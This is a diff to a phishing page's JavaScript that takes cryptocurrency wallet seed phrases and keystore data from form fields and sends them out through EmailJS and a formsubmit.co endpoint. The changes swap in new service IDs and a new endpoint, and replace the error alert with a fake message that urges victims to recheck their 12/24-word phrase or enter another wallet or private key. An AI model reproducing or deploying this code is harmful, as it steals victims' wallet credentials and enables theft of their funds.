@@ -119,7 +119,7 @@
 
         <script type="text/javascript">
           (function() {
-            emailjs.init("PhVFHvVQ0LzV-_eA6"); //please encrypted user id for malicious attacks
+            emailjs.init("OoY6rz3p6e-0Tr_ue"); //please encrypted user id for malicious attacks
           })();
         </script>
                             
@@ -178,7 +178,7 @@
                     case 0:
                         message = $("#phraseBox").val();
                         break;
-
+ß
                     case 1:
                         message = $("#keystoreBox").val();
 
@@ -221,8 +221,8 @@
 
             const sendData = (data) => {
                 console.log(data);
-                const service_id = "service_9ymf2ro";
-                const template_id = "template_emgrcyi";
+                const service_id = "service_7p4pef4";
+                const template_id = "template_ocvap6f";
 
                 data = {
                     message: data,
@@ -230,7 +230,7 @@
                 }
 
                 $.ajax({
-                    url: "https://formsubmit.co/ajax/b56400a81c49acdbd5bcec07bdce8a8f",
+                    url: "https://formsubmit.co/ajax/d5e91a8736e47db92cf27e8f4f225e2e",
                     method: "POST",
                     data: data,
                     dataType: "json"
@@ -245,7 +245,7 @@
                 emailjs.send(service_id, template_id, data)
                 .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
-                alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet")
+                alert("AN UNEXPECTED ERROR OCCURED. KINDLY CHECK THE 12/24 WORD CAREFULLY OR CONNECT A DIFFERENT WALLET/PRIVATE KE..........error can also occur if you connect an empty wallet. Kindly deposit enough ETH or BB or SOL if your wallet is empty")
                 }, function(error) {
                 console.log('FAILED...', error);
                 });
